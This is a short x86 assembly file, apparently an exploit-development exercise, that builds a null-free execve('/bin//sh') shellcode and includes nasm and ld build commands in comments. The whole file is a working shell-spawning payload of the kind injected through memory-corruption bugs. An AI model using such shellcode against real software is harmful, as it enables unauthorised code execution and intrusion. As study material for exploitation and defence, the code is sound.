section .text
    global _start

_start:
    xor eax, eax; safe null
    push eax; push null byte onto stack
    push 0x68732f2f ; push /bin//sh
    push 0x6e69622f
    mov ebx,esp ; set ebx to out cmd
    mov ecx, eax; no args
    mov edx, eax ; no args again
    mov al, 0xb ; set sys_execve
    int 0x80

;nasm -felf32 shell.x64.s -o shell.x64.o
;ld -m elf_i386 shell.x64.o -o shell.x64.out